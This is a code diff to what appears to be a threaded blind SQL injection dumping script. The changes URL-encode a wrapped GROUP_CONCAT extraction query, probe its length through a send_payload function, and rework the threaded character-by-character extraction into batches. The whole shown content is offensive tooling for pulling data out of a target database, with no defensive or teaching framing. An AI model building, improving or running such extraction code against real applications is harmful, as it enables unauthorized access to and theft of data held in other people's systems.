@@ -3,6 +3,9 @@ import requests
 from concurrent.futures import ThreadPoolExecutor
 import threading
 import queue
+import urllib.parse
+
+
 
 write_lock = threading.Lock()
 
@@ -213,7 +216,7 @@ def cquery():
     
     # Build the wrapped query using the extracted columns
     wrapped_query = f"SELECT GROUP_CONCAT(CONCAT_WS(',', {columns}) SEPARATOR '~') FROM ({raw_query}) AS subq"
-    
+    wrapped_query=urllib.parse.quote(wrapped_query)
     def len_cond(x):
         return send_payload(f"LENGTH(({wrapped_query})) < {x}")
     
@@ -271,9 +274,20 @@ def cquery():
             result[:j] = [""] * j
 
     # Run threaded jobs in batches
+#    with ThreadPoolExecutor(max_workers=args.threads) as executor:
+#        for j in range(1, result_len + 1):
+#            executor.submit(dump_char, j)
     with ThreadPoolExecutor(max_workers=args.threads) as executor:
-        for j in range(1, result_len + 1):
-            executor.submit(dump_char, j)
+        for batch_start in range(1, result_len + 1, args.threads):
+            batch_end = min(batch_start + args.threads, result_len + 1)
+            futures = []
+    
+            for j in range(batch_start, batch_end):
+                futures.append(executor.submit(dump_char, j))
+    
+            # Wait for all threads in the batch to complete before launching the next batch
+            for future in futures:
+                future.result()
 
     # After all threads are done, flush the final result
     final_result = "".join(all_results)
